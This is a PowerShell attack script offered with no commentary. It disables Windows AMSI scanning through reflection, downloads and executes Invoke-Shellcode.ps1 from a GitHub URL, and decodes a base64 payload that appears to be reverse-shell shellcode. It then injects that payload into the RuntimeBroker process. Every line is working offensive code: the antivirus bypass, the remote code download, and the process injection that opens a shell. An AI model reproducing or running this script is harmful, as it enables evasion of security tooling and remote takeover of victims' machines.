$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true);
iex (New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/GremlinStyle/tools/main/Invoke-Shellcode.ps1');

$runtimeBroker = tasklist | Where-Object { $_ -like "*RuntimeBroker*" };

if ($runtimeBroker) {
    $RuntimeBrokerPID = $runtimeBroker -split '\s+' | Select-Object -Index 1
    $res=1
}
if ($res) {
$enc = "/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSA+3SkpIi3JQTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAB+QwKgBrEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/VAA==";
$dec=[System.Convert]::FromBase64String($enc);
[Byte[]] $b = $dec;
Invoke-Shellcode -ProcessID $RuntimeBrokerPID -Shellcode $b -Force;
}